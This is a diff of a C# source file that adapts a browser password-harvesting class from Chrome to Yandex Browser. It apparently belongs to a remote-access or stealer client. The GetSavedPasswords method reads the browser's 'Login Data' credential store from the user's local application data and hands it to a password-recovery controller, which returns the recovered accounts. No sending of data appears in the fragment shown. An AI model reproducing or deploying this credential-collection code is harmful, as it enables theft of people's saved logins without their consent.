@@ -2,26 +2,23 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 
-namespace Client.Controllers.BrowsersControllers
+namespace Client.Controllers.Browsers
 {
-    class Chrome
+    class Yandex
     {
         public static List<RecoveredAccount> GetSavedPasswords()
         {
             try
             {
                 string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                "Google\\Chrome\\User Data\\Default\\Login Data");
-                return PasswordRecoveryController.Passwords(datapath, "Chrome");
+                "Yandex\\YandexBrowser\\User Data\\Default\\Login Data");
+                return PasswordRecoveryController.Passwords(datapath, "Yandex");
             }
             catch (Exception)
             {
                 return new List<RecoveredAccount>();
             }
-        }        
+        }
     }
 }
